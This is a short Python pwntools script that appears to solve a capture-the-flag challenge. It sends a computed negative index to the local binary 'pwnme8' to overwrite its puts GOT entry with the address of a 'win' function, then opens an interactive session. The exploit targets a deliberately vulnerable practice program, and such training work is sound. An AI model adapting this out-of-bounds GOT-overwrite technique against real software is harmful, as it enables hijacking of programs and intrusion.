import pwn


def main():
    pwn.context.binary = context = pwn.ELF("./pwnme8")
    offset = str(int((context.symbols["target"] - context.got.puts) / 8 * -1))
    offset = bytes(offset, "ascii")
    proc = pwn.process("./pwnme8")

    proc.sendline(offset)
    proc.sendline(bytes(str(context.symbols["win"]), "ascii"))

    proc.interactive()

main()

